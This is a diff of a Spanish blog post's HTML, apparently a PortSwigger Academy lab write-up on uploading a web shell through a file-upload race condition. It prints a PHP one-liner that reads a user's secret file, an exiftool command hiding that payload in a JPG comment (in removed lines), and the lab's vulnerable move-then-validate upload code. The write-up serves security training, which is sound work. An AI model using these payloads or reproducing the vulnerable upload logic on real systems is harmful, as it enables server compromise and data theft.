@@ -9,7 +9,7 @@
 <meta property='og:description' content='Lab: Web shell upload via race condition'>
 <meta property='og:url' content='https://www.alux.cc/p/portswigger-academy-learning-path-file-upload-lab-8/'>
 <meta property='og:site_name' content='A1ux'>
-<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='file upload' /><meta property='article:tag' content='portswigger' /><meta property='article:tag' content='academy' /><meta property='article:tag' content='burpsuite' /><meta property='article:published_time' content='2022-01-11T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2022-01-11T00:00:00&#43;00:00'/><meta property='og:image' content='https://www.alux.cc/p/portswigger-academy-learning-path-file-upload-lab-8/head.png' />
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='file upload' /><meta property='article:tag' content='portswigger' /><meta property='article:tag' content='academy' /><meta property='article:tag' content='burpsuite' /><meta property='article:published_time' content='2022-01-13T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2022-01-13T00:00:00&#43;00:00'/><meta property='og:image' content='https://www.alux.cc/p/portswigger-academy-learning-path-file-upload-lab-8/head.png' />
 <meta name="twitter:title" content="Portswigger Academy Learning Path: File Upload Lab 8">
 <meta name="twitter:description" content="Lab: Web shell upload via race condition"><meta name="twitter:card" content="summary_large_image">
     <meta name="twitter:image" content='https://www.alux.cc/p/portswigger-academy-learning-path-file-upload-lab-8/head.png' />
@@ -119,7 +119,7 @@ if (!doNotTrack) {
   <path d="M3 11h16" />
   <path d="M18 16.496v1.504l1 1" />
 </svg>
-                <time class="article-time--published">Jan 11, 2022</time>
+                <time class="article-time--published">Jan 13, 2022</time>
             </div>
         
 
@@ -134,7 +134,7 @@ if (!doNotTrack) {
 
 
                 <time class="article-time--reading">
-                    3 minutos a leer
+                    2 minutos a leer
                 </time>
             </div>
         
@@ -171,98 +171,92 @@ if (!doNotTrack) {
 <h2 id="explotacion">Explotacion</h2>
 <p>Creamos el archivo php con el siguiente codigo</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span> <span class="k">echo</span> <span class="nx">file_get_contents</span><span class="p">(</span><span class="s1">&#39;/home/carlos/secret&#39;</span><span class="p">);</span> <span class="cp">?&gt;</span><span class="err">
-</span></code></pre></div><p>Ahora enviamos el archivo, y vemos la respuesta que nos da diciendo que no se permite subir archivos de tipo <code>php</code> solamente <code>jpg y png</code>  aun cuando le agregamos las cabeceras para que sea un archivo de tipo jpg o png</p>
-<ul>
-<li><a class="link" href="https://en.wikipedia.org/wiki/List_of_file_signatures"  target="_blank" rel="noopener"
-    >https://en.wikipedia.org/wiki/List_of_file_signatures</a></li>
-</ul>
+</span></code></pre></div><p>Ahora se nos da el siguiente codigo para explicar que es lo que hace por atras el servidor y leyendolo entendemos que lo que hace es subir el archivo primero al servidor y ahi checarlo y validar, si es validado lo sube si no lo elimina, pero el principal problema es que se mantiene en el servidor por unos segundos el servicio. Por lo que nos podemos aprovechar de eso para explotarlo y subir directamente nuestro codigo php ya que hasta despues es validado.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
+<span class="nv">$target_dir</span> <span class="o">=</span> <span class="s2">&#34;avatars/&#34;</span><span class="p">;</span>
+<span class="nv">$target_file</span> <span class="o">=</span> <span class="nv">$target_dir</span> <span class="o">.</span> <span class="nv">$_FILES</span><span class="p">[</span><span class="s2">&#34;avatar&#34;</span><span class="p">][</span><span class="s2">&#34;name&#34;</span><span class="p">];</span>
+
+<span class="c1">// temporary move
+</span><span class="c1"></span><span class="nx">move_uploaded_file</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s2">&#34;avatar&#34;</span><span class="p">][</span><span class="s2">&#34;tmp_name&#34;</span><span class="p">],</span> <span class="nv">$target_file</span><span class="p">);</span>
+
+<span class="k">if</span> <span class="p">(</span><span class="nx">checkViruses</span><span class="p">(</span><span class="nv">$target_file</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nx">checkFileType</span><span class="p">(</span><span class="nv">$target_file</span><span class="p">))</span> <span class="p">{</span>
+    <span class="k">echo</span> <span class="s2">&#34;The file &#34;</span><span class="o">.</span> <span class="nx">htmlspecialchars</span><span class="p">(</span> <span class="nv">$target_file</span><span class="p">)</span><span class="o">.</span> <span class="s2">&#34; has been uploaded.&#34;</span><span class="p">;</span>
+<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+    <span class="nx">unlink</span><span class="p">(</span><span class="nv">$target_file</span><span class="p">);</span>
+    <span class="k">echo</span> <span class="s2">&#34;Sorry, there was an error uploading your file.&#34;</span><span class="p">;</span>
+    <span class="nx">http_response_code</span><span class="p">(</span><span class="mi">403</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="k">function</span> <span class="nf">checkViruses</span><span class="p">(</span><span class="nv">$fileName</span><span class="p">)</span> <span class="p">{</span>
+    <span class="c1">// checking for viruses
+</span><span class="c1"></span>    <span class="o">...</span>
+<span class="p">}</span>
+
+<span class="k">function</span> <span class="nf">checkFileType</span><span class="p">(</span><span class="nv">$fileName</span><span class="p">)</span> <span class="p">{</span>
+    <span class="nv">$imageFileType</span> <span class="o">=</span> <span class="nx">strtolower</span><span class="p">(</span><span class="nx">pathinfo</span><span class="p">(</span><span class="nv">$fileName</span><span class="p">,</span><span class="nx">PATHINFO_EXTENSION</span><span class="p">));</span>
+    <span class="k">if</span><span class="p">(</span><span class="nv">$imageFileType</span> <span class="o">!=</span> <span class="s2">&#34;jpg&#34;</span> <span class="o">&amp;&amp;</span> <span class="nv">$imageFileType</span> <span class="o">!=</span> <span class="s2">&#34;png&#34;</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">echo</span> <span class="s2">&#34;Sorry, only JPG &amp; PNG files are allowed</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">;</span>
+        <span class="k">return</span> <span class="k">false</span><span class="p">;</span>
+    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+        <span class="k">return</span> <span class="k">true</span><span class="p">;</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+<span class="cp">?&gt;</span><span class="err">
+</span></code></pre></div><p>Ahora que sabemos esto, lo que intentearemos es subir el archivo al servidor, para aprovechar ese pequeno tiempo subido y obtener la key. Pero antes vamos a configurar intruder para realizar peticiones indefinidamente.</p>
 <p><figure 
 	
 		class="gallery-image" 
 		style="
-			flex-grow: 173; 
-			flex-basis: 417px"
+			flex-grow: 337; 
+			flex-basis: 810px"
 	>
-	<a href="/p/portswigger-academy-learning-path-file-upload-lab-8/request.png" data-size="1453x836">
-		<img src="/p/portswigger-academy-learning-path-file-upload-lab-8/request.png"
-			width="1453"
-			height="836"
-			srcset="/p/portswigger-academy-learning-path-file-upload-lab-8/request_hua582e73131976041b5307ff163e1d469_129394_480x0_resize_box_3.png 480w, /p/portswigger-academy-learning-path-file-upload-lab-8/request_hua582e73131976041b5307ff163e1d469_129394_1024x0_resize_box_3.png 1024w"
+	<a href="/p/portswigger-academy-learning-path-file-upload-lab-8/intruder.png" data-size="1907x565">
+		<img src="/p/portswigger-academy-learning-path-file-upload-lab-8/intruder.png"
+			width="1907"
+			height="565"
+			srcset="/p/portswigger-academy-learning-path-file-upload-lab-8/intruder_hu2576e7f087000cba7c5aaa45ca711eb6_74685_480x0_resize_box_3.png 480w, /p/portswigger-academy-learning-path-file-upload-lab-8/intruder_hu2576e7f087000cba7c5aaa45ca711eb6_74685_1024x0_resize_box_3.png 1024w"
 			loading="lazy"
-			alt="Subida de archivo php al servidor">
+			alt="Peticion get para la solicitud del archivo php">
 	</a>
 	
-	<figcaption>Subida de archivo php al servidor</figcaption>
+	<figcaption>Peticion get para la solicitud del archivo php</figcaption>
 	
-</figure></p>
-<p>Despues de intentar tanto encontre algo de exiftool y agregar un comentario en el blog de hacktricks, asi que me decidi a agregar un comentario a una imagen jpg cualquiera.</p>
-<ul>
-<li><a class="link" href="https://book.hacktricks.xyz/pentesting-web/file-upload"  target="_blank" rel="noopener"
-    >https://book.hacktricks.xyz/pentesting-web/file-upload</a></li>
-</ul>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">alux@rootsystems:~/portswigger$ exiftool -Comment<span class="o">=</span><span class="s2">&#34;&lt;?php echo file_get_contents(&#39;/home/carlos/secret&#39;); ?&gt;&#34;</span> imagen.jpg
-    <span class="m">1</span> image files updated
-alux@rootsystems:~/portswigger$ exiftool imagen.jpg
-ExifTool Version Number         : 12.30
-File Name                       : imagen.jpg
-Directory                       : .
-File Size                       : <span class="m">73</span> KiB
-File Modification Date/Time     : 2022:01:11 20:55:52-06:00
-File Access Date/Time           : 2022:01:11 20:55:52-06:00
-File Inode Change Date/Time     : 2022:01:11 20:55:52-06:00
-File Permissions                : -rw-r--r--
-File Type                       : JPEG
-File Type Extension             : jpg
-MIME Type                       : image/jpeg
-JFIF Version                    : 1.01
-Resolution Unit                 : inches
-X Resolution                    : <span class="m">72</span>
-Y Resolution                    : <span class="m">72</span>
-Comment                         : &lt;?php <span class="nb">echo</span> file_get_contents<span class="o">(</span><span class="s1">&#39;/home/carlos/secret&#39;</span><span class="o">)</span><span class="p">;</span> ?&gt;
-Image Width                     : <span class="m">1080</span>
-Image Height                    : <span class="m">1350</span>
-Encoding Process                : Progressive DCT, Huffman coding
-Bits Per Sample                 : <span class="m">8</span>
-Color Components                : <span class="m">3</span>
-Y Cb Cr Sub Sampling            : YCbCr4:2:0 <span class="o">(</span><span class="m">2</span> 2<span class="o">)</span>
-Image Size                      : 1080x1350
-Megapixels                      : 1.5
-</code></pre></div><p>Ahora que tenemos nuestra imagen jpg con un comentario, procedemos a subirlo, pero esta vez interceptando y no modificando nada, mas que el <code>filename</code> y <code>Content-type</code> para que se suban como archivos php y que el servidor no lo tome como imagen aunque si valide su cabecera y sea realmente una imagen pero al ingresar al servidor todo su texto legible se tomara como php.</p>
-<p><figure 
-	
-		class="gallery-image" 
-		style="
-			flex-grow: 164; 
-			flex-basis: 395px"
-	>
-	<a href="/p/portswigger-academy-learning-path-file-upload-lab-8/request1.png" data-size="1446x877">
-		<img src="/p/portswigger-academy-learning-path-file-upload-lab-8/request1.png"
-			width="1446"
-			height="877"
-			srcset="/p/portswigger-academy-learning-path-file-upload-lab-8/request1_hu91d7f59288eecbfcf42c581e55282c20_168509_480x0_resize_box_3.png 480w, /p/portswigger-academy-learning-path-file-upload-lab-8/request1_hu91d7f59288eecbfcf42c581e55282c20_168509_1024x0_resize_box_3.png 1024w"
-			loading="lazy"
-			alt="Subida de archivo al servidor como imagen pero en formato php">
-	</a>
-	
-	<figcaption>Subida de archivo al servidor como imagen pero en formato php</figcaption>
-	
-</figure></p>
-<p>Ahora que hemos subido la imagen podemos ver la key y podemos notar entre todos los caracteres no legibles nuestra key, ya que todo lo esta interpretando como un php incluso los caracteres que no conoce.</p>
-<blockquote>
-<p>El valor de la key empieza despues del 9 si vemos la peticion anterior notaremos como esta el valor 9 entre el contenido de la imagen antes del comentario</p>
-</blockquote>
-<p><figure 
+</figure>
+<figure 
 	
 		class="gallery-image" 
 		style="
 			flex-grow: 161; 
 			flex-basis: 388px"
 	>
-	<a href="/p/portswigger-academy-learning-path-file-upload-lab-8/key.png" data-size="1371x848">
+	<a href="/p/portswigger-academy-learning-path-file-upload-lab-8/intruder2.png" data-size="654x404">
+		<img src="/p/portswigger-academy-learning-path-file-upload-lab-8/intruder2.png"
+			width="654"
+			height="404"
+			srcset="/p/portswigger-academy-learning-path-file-upload-lab-8/intruder2_hu8a4257aed4a241c253166bef48ec81f6_17721_480x0_resize_box_3.png 480w, /p/portswigger-academy-learning-path-file-upload-lab-8/intruder2_hu8a4257aed4a241c253166bef48ec81f6_17721_1024x0_resize_box_3.png 1024w"
+			loading="lazy"
+			alt="Ejecutar indefinidamente las peticiones con null payloads">
+	</a>
+	
+	<figcaption>Ejecutar indefinidamente las peticiones con null payloads</figcaption>
+	
+</figure></p>
+<blockquote>
+<p>Despues de este paso subimos nuestro codigo php y esperamos a que salga en nuestro ataque</p>
+</blockquote>
+<p>Ahora lo ejecutamos y entre las respuestas podemos ver como se ejecuta el codigo php y se nos muestra la key, eso si por un corto tiempo.</p>
+<p><figure 
+	
+		class="gallery-image" 
+		style="
+			flex-grow: 149; 
+			flex-basis: 358px"
+	>
+	<a href="/p/portswigger-academy-learning-path-file-upload-lab-8/key.png" data-size="845x565">
 		<img src="/p/portswigger-academy-learning-path-file-upload-lab-8/key.png"
-			width="1371"
-			height="848"
-			srcset="/p/portswigger-academy-learning-path-file-upload-lab-8/key_hu1003bf30908932c8466cedc67dac7580_243447_480x0_resize_box_3.png 480w, /p/portswigger-academy-learning-path-file-upload-lab-8/key_hu1003bf30908932c8466cedc67dac7580_243447_1024x0_resize_box_3.png 1024w"
+			width="845"
+			height="565"
+			srcset="/p/portswigger-academy-learning-path-file-upload-lab-8/key_hu2f0e68108bcca1ca8c6646dd63a34546_38314_480x0_resize_box_3.png 480w, /p/portswigger-academy-learning-path-file-upload-lab-8/key_hu2f0e68108bcca1ca8c6646dd63a34546_38314_1024x0_resize_box_3.png 1024w"
 			loading="lazy"
 			alt="Lectura de archivo secret de carlos">
 	</a>
@@ -275,14 +269,14 @@ Megapixels                      : 1.5
 	
 		class="gallery-image" 
 		style="
-			flex-grow: 284; 
-			flex-basis: 682px"
+			flex-grow: 218; 
+			flex-basis: 524px"
 	>
-	<a href="/p/portswigger-academy-learning-path-file-upload-lab-8/resuelto.png" data-size="1806x635">
+	<a href="/p/portswigger-academy-learning-path-file-upload-lab-8/resuelto.png" data-size="1798x823">
 		<img src="/p/portswigger-academy-learning-path-file-upload-lab-8/resuelto.png"
-			width="1806"
-			height="635"
-			srcset="/p/portswigger-academy-learning-path-file-upload-lab-8/resuelto_hu35a8ed710805121360124aa504d19757_84802_480x0_resize_box_3.png 480w, /p/portswigger-academy-learning-path-file-upload-lab-8/resuelto_hu35a8ed710805121360124aa504d19757_84802_1024x0_resize_box_3.png 1024w"
+			width="1798"
+			height="823"
+			srcset="/p/portswigger-academy-learning-path-file-upload-lab-8/resuelto_hu94cc5e01d440733ecf72da15c16b9356_217779_480x0_resize_box_3.png 480w, /p/portswigger-academy-learning-path-file-upload-lab-8/resuelto_hu94cc5e01d440733ecf72da15c16b9356_217779_1024x0_resize_box_3.png 1024w"
 			loading="lazy"
 			alt="Laboratorio resuelto">
 	</a>
